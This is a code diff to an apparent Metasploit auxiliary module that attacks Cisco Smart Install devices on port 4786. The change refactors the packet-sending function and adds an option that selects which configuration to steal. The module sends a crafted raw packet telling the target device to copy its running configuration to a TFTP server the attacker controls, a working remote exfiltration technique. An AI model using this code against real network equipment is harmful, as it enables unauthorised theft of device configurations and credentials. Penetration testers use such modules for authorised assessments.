@@ -42,7 +42,8 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(4786),
         OptAddressLocal.new('LHOST', [ false, "The IP address of the system running this module" ]),
-        OptInt.new('SLEEP', [ true, "Time to wait for config to come back", 10])
+        OptInt.new('SLEEP', [ true, "Time to wait for config to come back", 10]),
+        OptString.new('CONFIG', [ true, "The source config to copy when using DOWNLOAD", "system:running-config" ])
       ]
     )
   end
@@ -111,16 +112,15 @@ class MetasploitModule < Msf::Auxiliary
     string.scan(/../).map { |x| x.hex }.pack('c*')
   end
 
-  def send_packet
-    copy_config = "copy system:running-config tftp://#{@lhost}/#{Rex::Text.rand_text_alpha(8)}"
+  def request_config(tftp_server, config)
+    copy_config = "copy #{config} tftp://#{tftp_server}/#{Rex::Text.rand_text_alpha(8)}"
     packet_header = '00000001000000010000000800000408000100140000000100000000fc99473786600000000303f4'
     packet = (decode_hex(packet_header) + copy_config + decode_hex(('00' * (336 - copy_config.length)))) + (decode_hex(('00' * (336)))) + (decode_hex(('00' * 336)))
-    print_status("Requesting configuration from device...")
+    print_status("Attempting #{copy_config}")
     sock.put(packet)
   end
 
   def run_host(ip)
-    @lhost    = datastore['LHOST'] || Rex::Socket.source_address(ip)
     begin
       case
         when action.name == 'SCAN'
@@ -132,8 +132,8 @@ class MetasploitModule < Msf::Auxiliary
           return unless smi?
           disconnect # cant send any additional packets, so closing
           connect
-          print_status("Requesting configuration from device...")
-          send_packet
+          tftp_server = datastore['LHOST'] || Rex::Socket.source_address(ip)
+          request_config(tftp_server, datastore['CONFIG'])
           print_status("Waiting #{datastore['SLEEP']} seconds for configuration")
           Rex.sleep(datastore['SLEEP'])
       end
